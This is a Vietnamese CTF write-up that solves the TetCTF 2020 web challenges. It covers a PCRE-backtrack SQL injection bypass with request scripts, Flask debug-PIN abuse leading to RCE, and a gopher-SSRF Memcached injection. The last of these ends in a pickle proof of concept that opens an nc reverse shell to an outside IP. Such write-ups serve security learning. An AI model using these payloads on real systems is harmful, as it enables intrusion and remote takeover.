---
title: "TetCTF 2020 Web writeup"
summary: "Writeup for all the Web challenges in TetCTF 2020"
date: 2020-01-08
tags: ["ctf", "web"]
---
## WYSINWYG
```
What you see is not what you get... Do you see the flag? then you don't get the flag.
```

Tác giả cho ta một đoạn code PHP ngắn:
```php {hl_lines=["11-13"]}
<?php
ini_set("display_errors", 0);
include('secret.php');
show_source(__FILE__);

if (isset($_GET['a']) && isset($_GET['b'])) {
    $a = $_GET['a'];
    $b = $_GET['b'];
    if (!empty($a) && !empty($b)) {
        if ($a === $b) {
            if (isset($_GET['a⁡']) && isset($_GET['b⁦'])) {
                $a = $_GET['a⁡'];
                $b = $_GET['b⁦'];
                if ($a !== $b) {
                    die($flag);
                }
            }
        }
    }
}
```

Bài này tác giả chèn 2 kí tự [zero-width space](https://en.wikipedia.org/wiki/Zero-width_space) vào sau `a` và `b` ở dòng 11, 12 và 13.

PoC:
```
/?a=1&b=1&a%E2%81%A1=1&b%E2%81%A6=0
```

## Secure System
```
I created a security checker, can you help audit the source?
Source: https://drive.google.com/file/d/1vOPmS30ZrW5-Uoz-AKBef3T6no2qpvt_/view
```

Source code chỉ có 1 file index.php như sau:
```phtml
<?php
require_once('dbconnect.php');
$flag = mysqli_query($conn, "SELECT * FROM xxxxxxxxxxxxxxxxxxx")->fetch_assoc()['yyyyyyyyyyyyyyyyyyyy']; //Sorry It's our secret, can't share
?>

<br><br><br><br>
<center>
    Security Check!!! Please enter your ID to prove who are you !!!:
    <form action="index.php" method="POST">
        <input name="id" value=""/><br>
        <input type="submit" value="Submit"/>
    </form>
</center>

<?php
if (isset($_POST['id']) && !empty($_POST['id'])) {
    if (preg_match('/and|or|in|if|case|sleep|benchmark/is', $_POST['id'])) {
        die('Tet nhat ai lai hack nhau :(, very dangerous key word');
    } elseif (preg_match('/order.+?by|union.+?select/is', $_POST['id'])) {
        die('Tet nhat ai lai hack nhau :(, very dangerous statement');
    } else {
        $user = mysqli_query($conn, "SELECT * FROM users WHERE id=" . $_POST['id'])->fetch_assoc()['username'];
        if ($user !== 'admin') {
            echo 'Hello ' . htmlentities($user);
            if ($user === 'admin') {
                echo 'This can\'t be =]] Just put here for fun lul';
                die($flag);
            }
        }
    }
}
?>
```
Dòng 4 chúng ta có 1 hint của tác giả là phải sử dụng SQL Injection và leak được flag ở 1 column Y và table X nào đó mà chúng ta chưa biết trong database.

Chúng ta bị chặn sử dụng câu lệnh `order by` và `union select`, đặc biệt lưu ý là cụm `in` cũng bị chặn, điều này dẫn đến sẽ có đôi chút khó khăn để ta lấy được table name và column name từ `information_schema` cũng như các database có prefix `innodb`.

Nhưng chúng ta có thể bypass `preg_match` ở dòng 21 bằng cách làm cho PCRE (Engine xử lí Regular Expression trong PHP) xử lí input của ta, làm cho vượt quá backtrack limit mặc định [của](https://www.php.net/manual/en/pcre.configuration.php) [PHP](https://stackoverflow.com/a/40426462). Bằng cách này, chúng ta có thể sử dụng `order by` hay `union select` dễ dàng.

### Get table name
Mình quyết định sử dụng view `x$ps_schema_table_statistics_io` có trong database `sys` vì theo như [MySQL documentation](https://dev.mysql.com/doc/refman/5.7/en/sys-schema-table-statistics.html) mô tả:
```
These views summarize table statistics. By default, rows are sorted by descending total wait time (tables with most contention first).
```
và trong view này cũng có chứa 2 columns là `table_schema` và `table_name`.

```python
res = requests.post('http://45.77.240.178:8002/index.php', data={
    'id': '5 union/*' + 'a'*1000000 + '*/select 1,group_concat(table_name),3 from sys.x$ps_schema_table_statistics_io where table_schema=database()'
})
```

![](https://i.imgur.com/xKdXXBS.jpg)

Table name: `Th1z_Fack1n_Fl4444g_Tabl3`

### Get flag without knowing column name
Cách này đã được anh @tsug0d mô tả cực kì chi tiết và dễ hiểu trong [blog](https://tsublogs.wordpress.com/2017/06/07/pentest-qa-cung-tsu-5-sql-injection-without-information_schema/) của anh nên mình không dài dòng nữa. Get flag thôi! 

```python
res = requests.post('http://45.77.240.178:8002/index.php', data={
    'id': '5 union/*' + 'a'*1000000 + '*/select 1,b,3 from (select 1 a, 2 b union select * from Th1z_Fack1n_Fl4444g_Tabl3 limit 1,1)x'
})
```

![](https://i.imgur.com/iAgHzHz.jpg)

### Another way from the author
![](https://i.imgur.com/PVK8WBT.jpg)
🎉🎉🎉

## The Prophet
```
Wohoo, wanna hear some oracle?
```
Bài này chỉ có 1 chức năng cơ bản là đọc các file text có tên từ 1 - 5. Khi ta thử file `6.txt`, trang xuất hiện giao diện thông báo lỗi của Flask, chứng tỏ debug mode đang được enabled.
Trong giao diện báo lỗi, chúng ta có thể đọc 1 phần source code đã bị disclosed:

![](https://i.imgur.com/WvzEivs.jpg)

Ta dễ dàng thấy được lỗi Local File Inclusion (LFI) trong đoạn code xử lí đọc file này. Biến `filename` được truyền thẳng đến hàm `open()` và nội dung được đưa ra ngoài thông qua hàm `render_template()`. 

Ngay lúc này, mình nhận ra rằng việc chúng ta có lỗi LFI sẽ dẫn đến việc có thể [generate](https://www.kingkk.com/2018/08/Flask-debug-pin%E5%AE%89%E5%85%A8%E9%97%AE%E9%A2%98/) được debugger PIN code, sau đó sử dụng chức năng Interactive shell được tích hợp trong giao diện lỗi của Flask để có thể leverage lên RCE.

Sau khi làm theo bài hướng dẫn generate PIN code và đã có được PIN, giờ chỉ việc submit PIN và RCE thôi, nhưng đời không như mơ và cuộc sống không dễ thở...

![](https://i.imgur.com/lP07KrD.jpg)

Ok, tự trong đầu nghĩ chắc đây cũng là ý của tác giả thôi, chắc có chỗ nào đâu đó trong phần xử lí nhập PIN này có thể vượt được, let check it out. 🧐

```python {hl_lines=["10-26", 32, "44-46", "48-50"]}
# https://github.com/pallets/werkzeug/blob/master/src/werkzeug/debug/__init__.py
# ...
def hash_pin(pin):
    if isinstance(pin, text_type):
        pin = pin.encode("utf-8", "replace")
    return hashlib.md5(pin + b"shittysalt").hexdigest()[:12]
# ...
class DebuggedApplication(object):
    # ...
    def check_pin_trust(self, environ):
        """Checks if the request passed the pin test.  This returns `True` if the
        request is trusted on a pin/cookie basis and returns `False` if not.
        Additionally if the cookie's stored pin hash is wrong it will return
        `None` so that appropriate action can be taken.
        """
        if self.pin is None:
            return True
        val = parse_cookie(environ).get(self.pin_cookie_name)
        if not val or "|" not in val:
            return False
        ts, pin_hash = val.split("|", 1)
        if not ts.isdigit():
            return False
        if pin_hash != hash_pin(self.pin):
            return None
        return (time.time() - PIN_TIME) < int(ts)

    def pin_auth(self, request):
        """Authenticates with the pin."""
        exhausted = False
        auth = False
        trust = self.check_pin_trust(request.environ)

        # If the trust return value is `None` it means that the cookie is
        # set but the stored pin hash value is bad.  This means that the
        # pin was changed.  In this case we count a bad auth and unset the
        # cookie.  This way it becomes harder to guess the cookie name
        # instead of the pin as we still count up failures.
        bad_cookie = False
        if trust is None:
            self._fail_pin_auth()
            bad_cookie = True

        # If we're trusted, we're authenticated.
        elif trust:
            auth = True

        # If we failed too many times, then we're locked out.
        elif self._failed_pin_auth > 10:
            exhausted = True

        # Otherwise go through pin based authentication
        else:
            entered_pin = request.args.get("pin")
            if entered_pin.strip().replace("-", "") == self.pin.replace("-", ""):
                self._failed_pin_auth = 0
                auth = True
            else:
                self._fail_pin_auth()

        rv = Response(
            json.dumps({"auth": auth, "exhausted": exhausted}),
            mimetype="application/json",
        )
        if auth:
            rv.set_cookie(
                self.pin_cookie_name,
                "%s|%s" % (int(time.time()), hash_pin(self.pin)),
                httponly=True,
            )
        elif bad_cookie:
            rv.delete_cookie(self.pin_cookie_name)
        return rv
    # ...
```

Hai dòng được highlight là câu lệnh if kiểm tra điều kiện nếu nhập sai quá 10 lần thì `exhausted = True`, từ đó ta suy ra đã có người submit sai PIN khoảng 7 - 8 lần trước đó, để đến lượt mình thì sau khi thử 2 - 3 mã PIN thì nó lên 10. 😤

Ok, quay lại nào. Vì câu điều kiện check nhập sai nằm trong nhánh `elif` nên chỉ cần 2 câu điều kiện ở trên đúng thì sẽ không thực thi. Biến `trust` được khởi tạo với value là return value của hàm `check_pin_trust()`, hàm này thực hiện get và parse cookie, kiểm tra PIN hash trong cookie có đúng với PIN hash trên server hay không, PIN expired time có hết hạn hay chưa.

Vì chúng ta có thể control được cookie nên ta có thể tùy biến được cookie để vượt qua được việc check exhausted. Mình đã có quyền chạy Python code trên interactive shell rồi, tìm và đọc flag rất dễ dàng.

### Author nói gì?
Ok, giải xong inbox author thì ảnh bảo chỉ cần generate PIN code là xong rồi RCE lấy flag thôi, tại lúc đó setup có vấn đề nên mới bị exhausted. 😤

## MeePwnTube2050
![](https://i.imgur.com/PtWQV2F.jpg)
```
Source: https://drive.google.com/file/d/12MZJiMUCmLJ84-NypWByEzezkz4fx9RA/view
```
Bài này mình stuck đến ngày hôm sau mới nghĩ được hướng 😅

Vì mình ngâm đi ngâm lại source code nhiều lần để chắc chắn rằng không có 1 lỗi nào có thể xảy ra, và đến khi mình chợt để ý 1 chi tiết nhỏ trong search.php:

```php
<?php
include "dbconnect.php";

$_IP = $_SERVER['REMOTE_ADDR'];

if (isset($_GET['search'])) {
        if ($_IP === "45.76.148.212"){
            //local only homie
            $Name = $_GET['search'];
            $_search = mysqli_real_escape_string($admin_conn,$Name);
            $Execquery = mysqli_query($admin_conn, "SELECT id,Name FROM search WHERE Name LIKE '%$_search%' LIMIT 8");
            while ($Result = mysqli_fetch_array($Execquery)) {
                echo "<center>";
                echo "<b><p style='font-size:20px; color:green'>".$Result['Name']."</p></b>";
                echo "<iframe src='video".$Result['id'].".php' width='1200' height='300'></iframe>";
                echo "</center>";
                }
        }
        else {
            $Name = $_GET['search'];
            $_search = mysqli_real_escape_string($conn,$Name);
            $Execquery = mysqli_query($conn, "SELECT id,Name FROM search WHERE Name LIKE '%$_search%' LIMIT 8");
            while ($Result = mysqli_fetch_array($Execquery)) {
                echo "<center>";
                echo "<b><p style='font-size:20px; color:green'>".$Result['Name']."</p></b>";
                echo "<iframe src='video".$Result['id'].".php' width='1200' height='300'></iframe>";
                echo "</center>";
                }
        }
    }

?>
```

Tại dòng 10 nếu IP là `45.76.148.212` (cũng là IP của bot) thì nó sẽ lấy giá trị từ `DB_ADMIN` chứ không phải lấy giá trị từ DB thường. Từ đó làm mình nghĩ ngay tới bài [secret note keeper](https://ctftime.org/task/8659) trong giải [Facebook CTF 2019](https://ctftime.org/event/781) mà anh @ducnt đã giải và viết [writeup](http://www.ducnt.net/2019/06/xs-search-secret-note-keeper-facebook.html) trước đó.

Phần còn lại để các bạn trả lời... 😪

## HelloVietNamv2
https://www.youtube.com/watch?v=ZqjhmdRgXMw
```
Source: https://drive.google.com/file/d/142pMCn8qU565sQWOTsFALLEtjfjtbijs/view
```
Bài này cũng là 1 bài bị setup lỗi, dẫn đến nhiều team trong đó có mình giải theo hướng unintended (Command Injection) thay vì intended (Memcached Injection). Trong phần này mình sẽ chỉ nói về [cách intended của tác giả](https://www.blackhat.com/docs/us-14/materials/us-14-Novikov-The-New-Page-Of-Injections-Book-Memcached-Injections-WP.pdf).

### Where's the real bug in the source code?

```python
# ...
@app.route('/loadexternalvideo', methods=['GET', 'POST'])
def loadexternalvideo():
    if session.get('user'):
        if request.method == 'POST':
            # ...
            _url = request.form['video_url']
            # ...
            file = parse(_url)
            # ...
# ...
```

Nếu các bạn để ý tại hàm xử lí route `/loadexternalvideo` sẽ thấy 1 lỗi SSRF. Hàm `parse()` sử dùng PyCurl để request. Theo như documentation thì PyCurl là 1 interface của libcurl và đây là những protocol libcurl hỗ trợ:

![](https://i.imgur.com/pV7bHx7.jpg)

Vậy là chúng ta có thể sử dụng Gopher protocol, sound good!

Vậy Memcached Injection nằm ở đâu? Nằm ở chỗ sử dụng thư viện `pylibmc` trong Python. Nếu ai đã đọc qua slide được trình bày tại hội nghị Black Hat thì cũng đã thấy cái table này:

![](https://i.imgur.com/VvpXZM8.jpg)

Chúng ta có thể thấy, nếu dữ liệu chúng ta `set` vào key là 1 Pickle serialized data thì khi `get` cái key này, tùy theo `flags` mà chúng ta gửi lên mà `pylibmc` có deserialize Pickle hay không.

![](https://i.imgur.com/GhRjWz5.jpg)
Flag for Pickle deserialization: `(1 << 0) = 1`

Vậy chúng ta trigger được payload bằng cách nào? Cùng xem lại đoạn code sau:

```python {hl_lines=[2, 8]}
def racingboiz101(_key, _value):
    _speedup101 = pylibmc.Client(["127.0.0.1:11211"], binary=False)
    if _speedup101.get(_key) == None:
        _speedup101.set(_key, "Copyright@HelloVietNamv2", time=60)
        _speedup101.set(_value, _value, time=60)
        return _speedup101.get(_key), _speedup101.get(_value)
    else:
        _speedup101.set(_value, _value, time=60)
        return _speedup101.get(_key), _speedup101.get(_value)
```

Vậy để trigger được thì chúng ta cần phải `get` được key mà ta đã `set` cho Memcached trước đó thông qua Gopher protocol.

### Exploit
Dùng Gopher protocol request đến Memcached để `set` 1 key với tên bất kì (gọi key này tên là `this_is_key`) với value là pickle serialized data (aka payload) của chúng ta. Sau đó gọi đến route `/GIFmaker` để trigger cái key này.

Memcached command của chúng ta như sau:
```
set this_is_key 1 10 <payload_length>
<payload>
```
- `this_is_key` - là tên key mà chúng ta muốn set.
- `1` - đây là tham số `flags`, dùng để cho pylibmc biết khi `get` key này sẽ phải deserialize bằng Pickle.
- `10` - expired time, tính bằng giây.
- `<payload_length>` và `<payload>` thì chắc không cần phải giải thích nữa.

#### Proof-of-concept
```python
from time import time
from os import system
import urllib
import pickle
import requests
import random
import sys

ALPHA = "abcdefghijklmnopqrstuvwxyz"
def rand_string(length):
    return ''.join([random.choice(ALPHA) for _ in range(length)])


class Exploit(object):
    def __reduce__(self):
        return system, ('rm -f /tmp/f; mkfifo /tmp/f;cat /tmp/f | /bin/sh -i 2>&1 | nc 3.0.119.151 3000 > /tmp/f',)


title = rand_string(6)
payload = pickle.dumps(Exploit())
payload = [
    '',
    'set %s 1 10 %d' % (title, len(payload)),
    payload,
    ''
]

print 'Start requesting...'
try:
    res = requests.post('http://hellovietnamv2.0x1337.space:31337/loadexternalvideo', data={
        'inputTitle': rand_string(6),
        'inputDescription': 'description',
        'video_url': 'gopher://127.0.0.1:11211/_' + urllib.quote('\r\n'.join(payload)),
        'timestamp': int(time()) - 2
    }, cookies={
        'session': 'redacted'
    }, timeout=3)
    print res.content
except:
    pass
print 'Done!'

print 'Start triggering payload...'
try:
    res = requests.post('http://hellovietnamv2.0x1337.space:31337/GIFmaker', data={
        'inputTitle': title,
        'inputDescription': 'description',
        'filePath': 'static/Uploads/aa587ed19a228d98431f142900b60633.mp4',
        'timestamp': int(time()) - 2
    }, cookies={
        'session': 'redacted'
    }, timeout=3)
    print res.content
except:
    pass
print 'Done, exit program!'
```

![](https://i.imgur.com/gsyWzxH.jpg)

# Last words
Cảm ơn 2 anh [@ducnt](https://twitter.com/ducnt_) và [@tsug0d](https://twitter.com/tsug0d) đã tạo ra những đề Web hay ho cho dịp đầu năm 2020, support nhiệt tình cho em để có thể giải được hết tất cả các Web challenge cũng như nhằm ôn lại những kiến thức đã được học trong năm 2019 đã qua.

Chúc mừng năm mới 2️⃣0️⃣2️⃣0️⃣ everyone!